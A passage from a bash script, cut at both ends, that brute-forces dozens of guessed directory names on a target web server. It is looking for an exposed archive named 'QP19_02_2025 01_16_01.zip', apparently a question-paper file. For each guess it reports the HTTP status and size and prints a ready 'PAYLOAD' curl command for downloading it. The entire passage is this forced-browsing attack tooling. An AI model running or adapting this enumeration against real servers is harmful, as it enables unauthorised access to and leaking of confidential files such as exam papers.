${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_PMonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_PSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_PSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_PSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB_Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool_QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool_QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB_Sync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModuleQPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModuleQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModuleQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SystemQPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SystemQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SystemQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch_Handling/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch_Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch_Handling/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdminManagement/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdminManagement/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdminManagement/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP-Handler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP-Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP-Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto-Workflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto-Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto-Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagementQPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagementQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagementQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData_Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload_QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite_QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite_QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_Handler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper-System/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper-System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper-System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt-QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploaderSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploaderSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploaderSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin-Mgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin-Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin-Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PlatformQPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PlatformQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PlatformQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PortalQPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PortalQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PortalQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper_Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControlQPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControlQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControlQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP-MassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TransferQPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TransferQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TransferQPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync-QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Sync-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatchDataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatchDataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatchDataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps-QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager_System/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager_System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager_System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAutoSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAutoSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAutoSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaperSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaperSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaperSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_Upload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing-QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing-QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing-QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform-QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite-QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops_QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops_QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops_QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management_ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
